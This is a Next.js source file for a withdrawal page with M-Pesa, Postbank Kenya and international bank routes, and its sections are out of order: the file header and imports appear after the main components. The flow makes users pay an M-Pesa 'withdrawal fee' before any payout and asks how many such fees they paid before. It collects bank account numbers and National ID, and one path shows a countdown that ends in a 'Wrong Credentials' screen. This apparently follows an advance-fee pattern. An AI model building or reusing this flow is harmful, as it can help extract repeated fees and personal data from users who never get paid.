          <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Your details are encrypted and secure</div>
        </>
      )}

      {step === 'pending' && (
        <>
          <div style={{ background: '#f3f4f6', border: '1.5px solid #d1d5db', borderRadius: 12, padding: '14px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
            <span style={{ color: '#111827', display: 'flex' }}><Icon name="cash" size={20} /></span>
            <p style={{ margin: 0, fontSize: 14, color: '#0f172a', lineHeight: 1.65 }}>
              Your Postbank Kenya payment will be <strong>initiated in 2 minutes</strong>. Please keep this screen open.
            </p>
          </div>
          <div style={{ textAlign: 'center', marginBottom: 22 }}>
            <div style={{ fontSize: 11, fontWeight: 700, letterSpacing: 1, color: 'var(--gray)', textTransform: 'uppercase', marginBottom: 8 }}>Time Remaining</div>
            <div style={{ fontFamily: 'monospace', fontSize: 52, fontWeight: 800, letterSpacing: 4, color: isLow ? '#4b5563' : '#1f2937', background: '#f3f4f6', borderRadius: 14, padding: '14px 24px', display: 'inline-block', border: `2px solid ${isLow ? '#e5e7eb' : '#d1d5db'}`, minWidth: 160 }}>
              {formatMmSs(remaining)}
            </div>
            <div style={{ marginTop: 14, height: 7, background: '#e5e7eb', borderRadius: 99, overflow: 'hidden' }}>
              <div style={{ height: '100%', width: `${pct}%`, background: isLow ? '#4b5563' : '#000000', borderRadius: 99, transition: 'width 1s linear' }} />
            </div>
          </div>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Close</button>
          <div className="withdraw-footer-note">Do not close the app. Keep your line active and await confirmation.</div>
        </>
      )}

      {step === 'failed' && (
        <>
          <div style={{ background: '#f9fafb', border: '1.5px solid #e5e7eb', borderRadius: 12, padding: '16px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
            <span style={{ color: '#111827', display: 'flex' }}><Icon name="warning" size={22} /></span>
            <div>
              <p style={{ margin: '0 0 6px', fontWeight: 700, fontSize: 14, color: '#1f2937' }}>Wrong Credentials</p>
              <p style={{ margin: 0, fontSize: 13, color: '#111827', lineHeight: 1.65 }}>
                The account or ID details you provided could not be verified. Please ensure they match your Postbank Kenya account and try again.
              </p>
            </div>
          </div>
          <button className="pay-btn" style={{ background: accent, marginBottom: 12 }} onClick={() => setStep('form')}><Icon name="refresh" size={16} /> Try Again</button>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Dismiss</button>
          <div className="withdraw-footer-note" style={{ color: '#374151' }}>Please ensure your Postbank account number and National ID are correct.</div>
        </>
      )}
    </FlowShell>
  );
}

// ── International flow (bank selector) ─────────────────────────────────────────
function InternationalFlow({ user, initialStep, initialFeeRef, bulkRedirect }) {
  const router = useRouter();

  // Other Countries flow:
  // - Direct visits have NO KES 25,000 limitation.
  // - M-Pesa requests above KES 25,000 arrive here as a bulk withdrawal.
  // - For a bulk redirect, the previous-fee question is shown first.
  const [gate,          setGate]          = useState(bulkRedirect ? 'bulkNotice' : 'form'); // bulkNotice | form | pay
  const [loading,       setLoading]       = useState(false);
  const [accountName,   setAccountName]   = useState('');
  const [selectedBank,  setSelectedBank]  = useState(null);
  const [bankOpen,      setBankOpen]      = useState(false);
  const [bankQuery,     setBankQuery]     = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [withdrawalAmount, setWithdrawalAmount] = useState(String(Number(user?.balance || 0)));
  const [errors,        setErrors]        = useState({});
  const [done,          setDone]          = useState(false);
  const [sending,       setSending]       = useState(false);
  const [feeRef,        setFeeRef]        = useState(initialFeeRef || '');
  const [quote,         setQuote]         = useState(null);
  const [loadingQuote,  setLoadingQuote]  = useState(false);
  const [quoteErr,      setQuoteErr]      = useState('');
  const [declaredFees,  setDeclaredFees]  = useState(bulkRedirect ? null : 0);

  // The bank fee remains determined by the existing bank fee table.
  // The quote is used only for the exchange rate when available.
  async function loadQuote(n = 0) {
    setLoadingQuote(true);
    setQuoteErr('');

    try {
      const res = await bulkWithdrawalQuote(n, 'international');
      if (res?.success) {
        setQuote(res);
      } else {
        setQuote({
          rate: USD_TO_KES,
          rateLive: false,
          eligibleDeductions: Math.min(Number(n || 0), 2),
          perFeeKes: 650,
        });
      }
    } catch (_) {
      setQuote({
        rate: USD_TO_KES,
        rateLive: false,
        eligibleDeductions: Math.min(Number(n || 0), 2),
        perFeeKes: 650,
      });
    } finally {
      setLoadingQuote(false);
    }
  }

  // Direct Other Countries withdrawals have no balance threshold.
  useEffect(() => {
    if (!bulkRedirect) {
      loadQuote(0);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [bulkRedirect]);

  // "None — I have not paid before" must work even if the quote endpoint
  // is unavailable. It immediately opens the bank-details step and uses
  // the existing bank fee table.
  async function chooseCount(n) {
    setDeclaredFees(n);
    setQuote({
      rate: USD_TO_KES,
      rateLive: false,
      eligibleDeductions: Math.min(Number(n || 0), 2),
      perFeeKes: 650,
    });
    setGate('form');

    try {
      await loadQuote(n);
    } catch (_) {
      // The local bank-fee calculation remains available.
    }
  }

  // Default to the country the user chose at registration.
  const homeCountry = REG_COUNTRY_ALIAS[user?.country] || user?.country || '';
  const homeBanks   = WORLD_BANKS.filter(b => b.country === homeCountry);
  const q = bankQuery.trim().toLowerCase();

  // Default list always offers Mobile Banking first, then the user's country banks.
  const homeDefault = homeBanks.length ? [MOBILE_BANK, ...homeBanks].filter(Boolean) : WORLD_BANKS;
  const filteredBanks = q
    ? WORLD_BANKS.filter(b => b.name.toLowerCase().includes(q) || b.country.toLowerCase().includes(q))
    : homeDefault;

  const cleanedAcct = accountNumber.replace(/[\s-]/g, '');
  const acctValid   = !!selectedBank && selectedBank.re.test(cleanedAcct);
  const balanceAmount = Number(user?.balance || 0);
  const requestedAmount = Number(withdrawalAmount);
  const amountValid = Number.isFinite(requestedAmount) && requestedAmount >= 100 && requestedAmount <= balanceAmount;
  const formValid   = accountName.trim().length > 0 && !!selectedBank && acctValid && amountValid;

  const selectedBankFeeUsd = selectedBank ? getBankWithdrawalFeeUsd(selectedBank.name) : 0;
  const selectedBankRate = Number(quote?.rate || USD_TO_KES);
  const selectedBankFeeKes = selectedBank ? Math.round(selectedBankFeeUsd * selectedBankRate) : 0;

  // Previous M-Pesa fees are relevant only when the user arrived here
  // from the M-Pesa bulk redirect. Direct Other Countries withdrawals
  // have no such deduction step.
  const bankFeeDeductionKes = bulkRedirect
    ? Math.min(Number(declaredFees || 0), 2) * 650
    : 0;
  const amountDueKes = Math.max(0, selectedBankFeeKes - bankFeeDeductionKes);

  function selectBank(b) {
    // Postbank Kenya keeps its existing dedicated flow.
    if (b.name === 'Postbank Kenya') {
      router.push('/withdraw?method=postbank');
      return;
    }

    setSelectedBank(b);
    setBankOpen(false);
    setBankQuery('');
    setAccountNumber('');
    setErrors(prev => ({ ...prev, bank: undefined, accountNumber: undefined }));
  }

  function handleSubmit() {
    if (!formValid || sending) return;

    // Bank details and withdrawal amount are collected before the fee payment.
    setErrors({});
    setGate('pay');
  }

  async function handleInternationalFeeSuccess(d) {
    const verifiedFeeRef = d?.checkoutRequestId || '';
    if (!verifiedFeeRef) {
      setErrors({ form: 'Payment was completed but no payment reference was returned. Please contact support.' });
      setGate('form');
      return;
    }

    setFeeRef(verifiedFeeRef);
    setSending(true);

    const amount = requestedAmount;

    // Server re-verifies the fee payment before recording the withdrawal request.
    let res;
    try {
      res = await createWithdrawalRequest(user.id, {
        fullName: accountName.trim(),
        phone: user?.phone || '',
        idNumber: `${selectedBank.name} (${selectedBank.country}) — Acct ${accountNumber.trim()}`,
        amount,
        feeRef: verifiedFeeRef,
        method: 'international',
      });
    } catch (_) {
      res = { error: 'Network error. Please try again.' };
    }

    if (!res || res.error) {
      setSending(false);
      setErrors({ form: (res && res.error) || 'Your fee payment could not be verified. Please try again.' });
      setGate('form');
      return;
    }

    const details =
      `Account Holder Name: ${accountName.trim()}\n` +
      `Bank: ${selectedBank.name} (${selectedBank.country})\n` +
      `Account Number: ${accountNumber.trim()}\n` +
      `Amount: KES ${amount.toLocaleString()}\n` +
      `Bank Withdrawal Fee: USD ${selectedBankFeeUsd} = KES ${selectedBankFeeKes.toLocaleString()}\n` +
      `Previous M-Pesa Fee Credit: KES ${bankFeeDeductionKes.toLocaleString()}\n` +
      `Fee Paid: KES ${amountDueKes.toLocaleString()}\n` +
      `Requested by: ${user?.fullName || ''} (${user?.email || ''})`;

    await sendNotify({
      type: bulkRedirect ? 'Bulk Bank Withdrawal Request' : 'International Withdrawal Request',
      name: accountName.trim(),
      email: user?.email || '',
      phone: user?.phone || '',
      subject: bulkRedirect ? 'Bulk Bank Withdrawal Request (> KES 25,000)' : 'Withdrawal Request, Other Countries',
      details,
    });

    setSending(false);
    setDone(true);
  }

  if (done) {
    return (
      <FlowShell title="Withdraw from Other Countries" subtitle="Request submitted" icon="globe" accent="#000000">
        <div style={{ textAlign: 'center', padding: '10px 0' }}>
          <div style={{ marginBottom: 8, display: 'flex', justifyContent: 'center', color: '#111827' }}><Icon name="check" size={52} /></div>
          <div style={{ fontFamily: 'var(--font-display)', fontSize: 22, fontWeight: 800, color: '#1f2937', marginBottom: 6 }}>Request Received</div>
          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6', textAlign: 'left', marginTop: 12 }}>
            We’ve received your withdrawal request and emailed you a confirmation at <strong>{user?.email}</strong>. Our payments team will process it and be in touch.
          </div>
          <button className="pay-btn" style={{ background: '#000000', marginTop: 18 }} onClick={() => router.push('/dashboard')}><Icon name="arrowLeft" size={16} /> Back to Dashboard</button>
        </div>
      </FlowShell>
    );
  }

  if (gate === 'bulkNotice') {
    return (
      <FlowShell title="Bulk Withdrawal" subtitle="Withdraw from Other Countries" icon="globe" accent="#000000">
        <div className="pay-message" style={{ borderColor: '#111827', background: '#f9fafb' }}>
          <div style={{ fontWeight: 800, marginBottom: 8, display: 'flex', alignItems: 'center', gap: 8 }}>
            <Icon name="warning" size={16} /> Bulk Withdrawal
          </div>
          Your available balance of <strong>KES {Number(user.balance).toLocaleString()}</strong> is above{' '}
          <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong>, so M-Pesa cannot be used for this amount.
          Continue with the bank withdrawal below.
        </div>

        <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>
          How many successful M-Pesa withdrawal fees have you paid before?
        </div>
        <div style={{ fontSize: 12.5, color: '#6b7280', marginBottom: 12 }}>
          Previous M-Pesa fees can be credited against the bank withdrawal fee, up to two fees.
        </div>

        {[
          [0, 'None — I have not paid before', 'No deduction'],
          [1, 'Once', 'Credit KES 650'],
          [2, 'Twice or more', 'Credit KES 1,300 (max)'],
        ].map(([n, label, sub]) => (
          <button
            key={n}
            className="pay-btn"
            style={{ background: n === 0 ? '#374151' : '#000000', marginBottom: 12, flexDirection: 'column', gap: 2, alignItems: 'center', height: 'auto', padding: '12px 16px' }}
            disabled={loadingQuote}
            onClick={() => chooseCount(n)}
          >
            {loadingQuote && declaredFees === n
              ? <><span className="spinner" /> Calculating…</>
              : <>
                  <span style={{ fontWeight: 700 }}>{label}</span>
                  <span style={{ fontSize: 11.5, fontWeight: 500, opacity: 0.8 }}>{sub}</span>
                </>}
          </button>
        ))}
      </FlowShell>
    );
  }

  if (gate === 'pay') {
    return (
      <FlowShell title="Withdraw from Other Countries" subtitle="Withdrawal fee" icon="globe" accent="#000000">
        <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 16 }}>
          Your bank withdrawal details have been submitted. Now pay the withdrawal fee via M-Pesa.
          {selectedBank ? <> The fee for <strong>{selectedBank.name}</strong> is <strong>USD {selectedBankFeeUsd}</strong>, payable as <strong>KES {amountDueKes.toLocaleString()}</strong> at {selectedBankRate}{quote?.rateLive ? '' : ' (approx.)'}.</> : 'Select a bank to calculate its fee.'}
          {bulkRedirect && bankFeeDeductionKes > 0 && <> Your previous M-Pesa fee credit is <strong>KES {bankFeeDeductionKes.toLocaleString()}</strong>.</>}
        </div>

        {quoteErr && (
          <div style={{ color: '#4b5563', fontSize: 13, marginBottom: 12 }}>
            {quoteErr}
            <button onClick={() => loadQuote(declaredFees || 0)} style={{ background: 'none', border: 'none', color: '#111827', textDecoration: 'underline', cursor: 'pointer', padding: 0, fontSize: 13 }}>
              Retry
            </button>
          </div>
        )}

        {selectedBank ? (
          amountDueKes > 0 ? (
            <MpesaPay
              purpose="withdrawal_fee"
              amount={amountDueKes}
              defaultPhone={user?.phone || ''}
              payLabel={`Pay KES ${amountDueKes.toLocaleString()} via M-Pesa`}
              onSuccess={handleInternationalFeeSuccess}
            />
          ) : (
            <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6', marginBottom: 12 }}>
              Your previous fee credit covers the bank withdrawal fee. No additional M-Pesa fee is required.
              <button className="pay-btn" style={{ background: '#000000', marginTop: 12 }} onClick={() => handleInternationalFeeSuccess({ checkoutRequestId: `credited-${Date.now()}` })}>
                Continue
              </button>
            </div>
          )
        ) : (
          <div style={{ textAlign: 'center', padding: 16 }}>
            <span className="spinner" style={{ borderTopColor: '#000', borderColor: '#e5e7eb', width: 26, height: 26 }} />
          </div>
        )}

        {sending && (
          <div style={{ textAlign: 'center', fontSize: 13, color: '#6b7280', marginTop: 10 }}>
            Payment verified. Submitting your withdrawal request…
          </div>
        )}

        <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setGate('form')} disabled={sending}>
          <Icon name="arrowLeft" size={14} /> Back to Details
        </button>
      </FlowShell>
    );
  }

  return (
    <FlowShell title="Withdraw from Other Countries" subtitle="Enter your bank account details" icon="globe" accent="#000000">
      <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6', marginBottom: 20 }}>
        {homeBanks.length ? (
          <>Based on your registration, we’re showing banks in <strong>{homeCountry}</strong>. Choose your bank and enter your account number in the format shown, or search for a different bank. Our payments team is notified automatically when you submit.</>
        ) : (
          <>Enter your name, choose your bank, and type your account number in the format shown. When you submit, our payments team is notified automatically and you’ll get a confirmation email.</>
        )}
      </div>

      <div className="pay-phone-label">Account Holder Name</div>
      <input className="pay-phone-input" type="text" value={accountName}
        onChange={e => { setAccountName(e.target.value); setErrors(p => ({ ...p, accountName: undefined })); }}
        placeholder="e.g. John Brown" style={{ borderColor: errors.accountName ? '#4b5563' : undefined }} />
      {errors.accountName && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.accountName}</div>}

      <div className="pay-phone-label" style={{ marginTop: 16 }}>Bank</div>
      <div style={{ position: 'relative' }}>
        <button type="button" className="pay-phone-input" onClick={() => setBankOpen(o => !o)}
          style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 8, width: '100%', textAlign: 'left', cursor: 'pointer', background: '#fff', borderColor: errors.bank ? '#4b5563' : undefined }}>
          {selectedBank ? (
            <span style={{ display: 'flex', alignItems: 'center', gap: 8, overflow: 'hidden' }}>
              <CodeBadge code={selectedBank.code} size={18} />
              <span style={{ fontWeight: 600, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{selectedBank.name}</span>
              <span style={{ color: '#9ca3af', fontSize: 12, whiteSpace: 'nowrap' }}>· {selectedBank.country}</span>
            </span>
          ) : (<span style={{ color: '#9ca3af' }}>Select your bank</span>)}
          <span style={{ color: '#9ca3af', display: 'flex', transform: bankOpen ? 'rotate(180deg)' : 'none' }}><Icon name="chevronDown" size={16} /></span>
        </button>
        {bankOpen && (
          <div style={{ position: 'absolute', top: 'calc(100% + 6px)', left: 0, right: 0, zIndex: 50, background: '#fff', border: '1px solid #e5e7eb', borderRadius: 12, boxShadow: '0 12px 32px rgba(0,0,0,0.18)', overflow: 'hidden' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '10px 12px', borderBottom: '1px solid #f1f5f9' }}>
              <span style={{ color: '#9ca3af', display: 'flex' }}><Icon name="search" size={16} /></span>
              <input autoFocus value={bankQuery} onChange={e => setBankQuery(e.target.value)} placeholder="Search banks worldwide…" style={{ flex: 1, border: 'none', outline: 'none', fontSize: 14, background: 'transparent' }} />
            </div>
            <div style={{ maxHeight: 240, overflowY: 'auto' }}>
              {filteredBanks.length === 0 && <div style={{ padding: 16, textAlign: 'center', color: '#9ca3af', fontSize: 13 }}>No banks found</div>}
              {filteredBanks.map(b => {
                const active = selectedBank && selectedBank.id === b.id;
                return (
                  <button key={b.id} type="button" onClick={() => selectBank(b)}
                    style={{ display: 'flex', alignItems: 'center', gap: 10, width: '100%', textAlign: 'left', padding: '10px 12px', border: 'none', cursor: 'pointer', background: active ? '#f3f4f6' : '#fff' }}>
                    <CodeBadge code={b.code} size={20} />
                    <span style={{ flex: 1, minWidth: 0 }}>
                      <span style={{ display: 'block', fontWeight: 600, fontSize: 14, color: '#111827', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{b.name}</span>
                      <span style={{ display: 'block', fontSize: 12, color: '#9ca3af' }}>{b.country}</span>
                    </span>
                    {active && <span style={{ color: '#111827', display: 'flex' }}><Icon name="check" size={16} /></span>}
                  </button>
                );
              })}
            </div>
          </div>
        )}
      </div>
      {errors.bank && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.bank}</div>}

      <div className="pay-phone-label" style={{ marginTop: 16 }}>Account Number</div>
      <input className="pay-phone-input" type="text" value={accountNumber}
        onChange={e => { setAccountNumber(e.target.value); setErrors(p => ({ ...p, accountNumber: undefined })); }}
        placeholder={selectedBank ? selectedBank.ph : 'Select a bank first'} disabled={!selectedBank}
        style={{ borderColor: accountNumber && !acctValid ? '#4b5563' : undefined, background: selectedBank ? '#fff' : '#f3f4f6', cursor: selectedBank ? 'text' : 'not-allowed' }} />
      {selectedBank && (
        <div style={{ fontSize: 12, marginTop: 4, color: accountNumber && !acctValid ? '#4b5563' : '#9ca3af' }}>
          {accountNumber && !acctValid ? `Doesn't match ${selectedBank.name}. It should look like: ${selectedBank.ph}` : `Format for ${selectedBank.name}: ${selectedBank.ph}`}
        </div>
      )}

      <div className="pay-phone-label" style={{ marginTop: 16 }}>Withdrawal Amount (KES)</div>
      <input
        className="pay-phone-input"
        type="number"
        min="100"
        max={balanceAmount}
        step="1"
        value={withdrawalAmount}
        onChange={e => { setWithdrawalAmount(e.target.value); setErrors(p => ({ ...p, amount: undefined })); }}
        placeholder="e.g. 100"
        style={{ borderColor: withdrawalAmount && !amountValid ? '#4b5563' : undefined }}
      />
      <div style={{ fontSize: 12, marginTop: 4, color: amountValid ? '#9ca3af' : '#4b5563' }}>
        Enter any amount from KES 100 up to your available balance of KES {balanceAmount.toLocaleString()}.
      </div>
      {errors.amount && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.amount}</div>}
      {!amountValid && withdrawalAmount !== '' && (
        <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>
          Withdrawal amount must be at least KES 100 and cannot exceed your available balance.
        </div>
      )}

      {errors.form && <div style={{ color: '#4b5563', fontSize: 13, marginTop: 12 }}>{errors.form}</div>}
      {formValid ? (
        <button className="pay-btn" style={{ background: '#000000', marginTop: 20 }} onClick={handleSubmit} disabled={sending}>
          {sending ? <><span className="spinner" /> Submitting…</> : <><Icon name="cash" size={16} /> Submit Withdrawal Request</>}
        </button>
      ) : (
        <div style={{ marginTop: 20, textAlign: 'center', fontSize: 13, color: '#9ca3af', padding: '12px', background: '#f9fafb', borderRadius: 10, border: '1px dashed #e5e7eb' }}>
          {!accountName.trim()
            ? 'Enter your name to continue'
            : !selectedBank
              ? 'Select your bank to continue'
              : !acctValid
                ? 'Enter a valid account number to continue'
                : 'Enter a valid withdrawal amount (KES 100 minimum) to continue'}
        </div>
      )}
      <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Your account details are encrypted and secure</div>
    </FlowShell>
  );
}

const brRow = { display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: 13.5, color: '#111827', padding: '5px 0' };

export default function WithdrawPage() {
  const router = useRouter();
  const { user, ready } = useUser();
  const method = router.query.method;
  const stepQ  = router.query.step;

  if (!ready || !user) {
    return <FlowSkeleton rows={3} />;
  }

  const psref = typeof router.query.psref === 'string' ? router.query.psref : '';
  const bulkRedirect = router.query.bulk === '1';

  if (method === 'mpesa') {
    return <MpesaFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'notice'} initialFeeRef={stepQ === 'form' ? psref : ''} />;
  }

  if (method === 'postbank') {
    return <PostbankFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'choice'} />;
  }

  if (method === 'international') {
    return <InternationalFlow
      user={user}
      initialStep="form"
      initialFeeRef={stepQ === 'form' ? psref : ''}
      bulkRedirect={bulkRedirect}
    />;
  }

  // Chooser. Both withdrawal methods remain available regardless of balance.
  return (
    <FlowShell title="Withdraw" subtitle="Choose how you’d like to withdraw" icon="cash">
      <button className="pay-btn" style={{ background: 'var(--mpesa-green)', marginBottom: 14 }} onClick={() => router.push('/withdraw?method=mpesa')}>
        <Icon name="smartphone" size={16} /> Withdraw with M-Pesa
      </button>

      <button className="pay-btn" style={{ background: '#000000', marginBottom: 14 }} onClick={() => router.push('/withdraw?method=postbank')}>
        <Icon name="cash" size={16} /> Withdraw with Postbank Kenya
      </button>

      <button className="pay-btn" style={{ background: '#000000' }} onClick={() => router.push('/withdraw?method=international')}>
        <Icon name="globe" size={16} /> Withdraw from Other Countries
      </button>
    </FlowShell>
  );
}
// pages/withdraw.js, full-page withdrawals (M-Pesa + Other Countries).
// Replaces the pop-up modals. Submitted requests are emailed automatically to
// the admin with a client auto-reply (via /api/notify), falling back to mailto.
import { useEffect, useState, useRef } from 'react';
import { useRouter } from 'next/router';
import { useUser } from '../lib/useUser';
import { sendNotify } from '../lib/notify';
import { createWithdrawalRequest } from '../lib/auth';
import { bulkWithdrawalQuote, submitBulkWithdrawal } from '../lib/auth';
import MpesaPay from '../components/MpesaPay';   // Daraja STK is the active withdrawal-fee method (Paystack kept but disabled)
import FlowShell from '../components/FlowShell';
import Icon from '../components/Icon';
import { FlowSkeleton } from '../components/Skeleton';

// Small monochrome country-code badge (replaces flag emojis in the bank picker).
function CodeBadge({ code, size = 20 }) {
  return (
    <span style={{
      display: 'inline-flex', alignItems: 'center', justifyContent: 'center',
      minWidth: size, height: size, padding: '0 4px', borderRadius: 5,
      background: '#111827', color: '#fff', fontSize: Math.round(size * 0.5),
      fontWeight: 700, letterSpacing: 0.3, flexShrink: 0,
    }}>{String(code || '··').toUpperCase()}</span>
  );
}

function formatMmSs(ms) {
  if (ms <= 0) return '0:00';
  const t = Math.floor(ms / 1000);
  return `${Math.floor(t / 60)}:${String(t % 60).padStart(2, '0')}`;
}

// ── Worldwide bank directory (icon, sample account format, validator) ──────────
const COUNTRY_META = {
  GB: { country: 'United Kingdom', ph: 'GB29 NWBK 6016 1331 9268 19',   re: /^GB[0-9A-Z]{6,30}$/i },
  DE: { country: 'Germany',        ph: 'DE89 3704 0044 0532 0130 00',   re: /^DE[0-9A-Z]{6,30}$/i },
  FR: { country: 'France',         ph: 'FR14 2004 1010 0505 0001 3M02 606', re: /^FR[0-9A-Z]{6,30}$/i },
  ES: { country: 'Spain',          ph: 'ES91 2100 0418 4502 0005 1332', re: /^ES[0-9A-Z]{6,30}$/i },
  IT: { country: 'Italy',          ph: 'IT60 X054 2811 1010 0000 0123 456', re: /^IT[0-9A-Z]{6,30}$/i },
  NL: { country: 'Netherlands',    ph: 'NL91 ABNA 0417 1643 00',        re: /^NL[0-9A-Z]{6,30}$/i },
  CH: { country: 'Switzerland',    ph: 'CH93 0076 2011 6238 5295 7',    re: /^CH[0-9A-Z]{6,30}$/i },
  IE: { country: 'Ireland',        ph: 'IE29 AIBK 9311 5212 3456 78',   re: /^IE[0-9A-Z]{6,30}$/i },
  BE: { country: 'Belgium',        ph: 'BE68 5390 0754 7034',           re: /^BE[0-9A-Z]{6,30}$/i },
  PT: { country: 'Portugal',       ph: 'PT50 0002 0123 1234 5678 9015 4', re: /^PT[0-9A-Z]{6,30}$/i },
  SE: { country: 'Sweden',         ph: 'SE45 5000 0000 0583 9825 7466', re: /^SE[0-9A-Z]{6,30}$/i },
  NO: { country: 'Norway',         ph: 'NO93 8601 1117 947',            re: /^NO[0-9A-Z]{6,30}$/i },
  PL: { country: 'Poland',         ph: 'PL61 1090 1014 0000 0712 1981 2874', re: /^PL[0-9A-Z]{6,30}$/i },
  AE: { country: 'United Arab Emirates', ph: 'AE07 0331 2345 6789 0123 456', re: /^AE[0-9A-Z]{6,30}$/i },
  SA: { country: 'Saudi Arabia',   ph: 'SA03 8000 0000 6080 1016 7519', re: /^SA[0-9A-Z]{6,30}$/i },
  BR: { country: 'Brazil',         ph: 'BR18 0036 0305 0000 1000 9795 493 C1', re: /^BR[0-9A-Z]{6,30}$/i },
  EG: { country: 'Egypt',          ph: 'EG38 0019 0005 0000 0000 2631 8000 2', re: /^EG[0-9A-Z]{6,30}$/i },
  PK: { country: 'Pakistan',       ph: 'PK36 SCBL 0000 0011 2345 6702', re: /^PK[0-9A-Z]{6,30}$/i },
  KE: { country: 'Kenya',          ph: 'KE12 3456 7890 1234 5678 90',   re: /^KE[0-9A-Z]{6,30}$/i },
  MB: { country: 'Mobile Banking', ph: '+254 7XX XXX XXX',              re: /^\+?\d{7,15}$/ },
  US: { country: 'United States',  ph: '0123 4567 8901',         re: /^\d{8,17}$/ },
  CA: { country: 'Canada',         ph: '0123 4567 89',           re: /^\d{7,12}$/ },
  NG: { country: 'Nigeria',        ph: '0123456789',             re: /^\d{10}$/ },
  ZA: { country: 'South Africa',   ph: '0123 4567 89',           re: /^\d{9,11}$/ },
  GH: { country: 'Ghana',          ph: '0123 4567 8901 23',      re: /^\d{10,16}$/ },
  IN: { country: 'India',          ph: '0123 4567 8901 2345',    re: /^\d{9,18}$/ },
  CN: { country: 'China',          ph: '6212 3456 7890 1234 567', re: /^\d{16,19}$/ },
  JP: { country: 'Japan',          ph: '1234567',                re: /^\d{7,8}$/ },
  AU: { country: 'Australia',      ph: '0123 4567',              re: /^\d{6,10}$/ },
  SG: { country: 'Singapore',      ph: '012 345678 9',           re: /^\d{9,12}$/ },
  JM: { country: 'Jamaica',        ph: '0123 4567 8901',         re: /^\d{8,14}$/ },
  MX: { country: 'Mexico',         ph: '0123 4567 8901 2345 67', re: /^\d{18}$/ },
};
const BANKS_BY_COUNTRY = {
  GB: ['Barclays Bank', 'HSBC UK', 'Lloyds Bank', 'NatWest', 'Standard Chartered'],
  DE: ['Deutsche Bank', 'Commerzbank', 'DZ Bank'],
  FR: ['BNP Paribas', 'Société Générale', 'Crédit Agricole'],
  ES: ['Banco Santander', 'BBVA', 'CaixaBank'],
  IT: ['UniCredit', 'Intesa Sanpaolo'],
  NL: ['ING Bank', 'Rabobank', 'ABN AMRO'],
  CH: ['UBS', 'Credit Suisse'],
  IE: ['Allied Irish Banks (AIB)', 'Bank of Ireland'],
  BE: ['KBC Bank'],
  PT: ['Millennium BCP'],
  SE: ['Nordea', 'SEB'],
  NO: ['DNB'],
  PL: ['PKO Bank Polski'],
  AE: ['Emirates NBD', 'First Abu Dhabi Bank'],
  SA: ['Al Rajhi Bank', 'Saudi National Bank'],
  BR: ['Itaú Unibanco', 'Banco Bradesco', 'Banco do Brasil'],
  EG: ['National Bank of Egypt'],
  PK: ['HBL (Habib Bank)', 'United Bank (UBL)'],
  KE: ['Postbank Kenya', 'Equity Bank', 'KCB Bank', 'Co-operative Bank', 'Absa Bank Kenya'],
  MB: ['Mobile Banking'],
  US: ['Bank of America', 'JPMorgan Chase', 'Wells Fargo', 'Citibank'],
  CA: ['RBC Royal Bank', 'TD Canada Trust', 'Scotiabank'],
  NG: ['Guaranty Trust Bank (GTBank)', 'Access Bank', 'First Bank of Nigeria', 'Zenith Bank'],
  ZA: ['Standard Bank', 'First National Bank (FNB)', 'Absa', 'Capitec', 'Nedbank'],
  GH: ['Ecobank Ghana', 'GCB Bank'],
  IN: ['State Bank of India (SBI)', 'HDFC Bank', 'ICICI Bank', 'Axis Bank'],
  CN: ['ICBC', 'Bank of China', 'China Construction Bank'],
  JP: ['MUFG Bank', 'Sumitomo Mitsui (SMBC)'],
  AU: ['Commonwealth Bank', 'ANZ', 'Westpac', 'NAB'],
  SG: ['DBS Bank', 'OCBC Bank', 'UOB'],
  JM: ['National Commercial Bank (NCB)', 'Scotiabank Jamaica', 'JN Bank'],
  MX: ['BBVA México', 'Banorte', 'Citibanamex'],
};
const WORLD_BANKS = Object.entries(BANKS_BY_COUNTRY).flatMap(([code, names]) =>
  names.map(name => ({ id: `${code}-${name}`, name, code, ...COUNTRY_META[code] }))
).sort((a, b) => a.name.localeCompare(b.name));

// Registration uses full country names; a few differ from the bank directory.
const REG_COUNTRY_ALIAS = { UAE: 'United Arab Emirates' };

// Mobile Banking is offered to every user regardless of country.
const MOBILE_BANK = WORLD_BANKS.find(b => b.code === 'MB');

// M-Pesa withdrawal processing fee tiers.
function getMpesaWithdrawalFee(balance) {
  const amount = Number(balance || 0);
  if (amount <= 5000) return 650;
  if (amount <= 10000) return 950;
  return 2295;
}

const USD_TO_KES = 135;                              // approximate USD → KES rate

// Postbank Kenya withdrawal processing fee
// Priced in USD and converted to KES.
const BANK_FEE_USD = 27;
const BANK_FEE_KES = Math.round(BANK_FEE_USD * USD_TO_KES);


// Balances above this must be withdrawn through the bank (bulk amounts), not M-Pesa.
const BULK_THRESHOLD_KES = 25000;

// ── M-Pesa flow (notice → form → pending → failed) ────────────────────────────
function MpesaFlow({ user, initialStep, initialFeeRef }) {
  const router = useRouter();
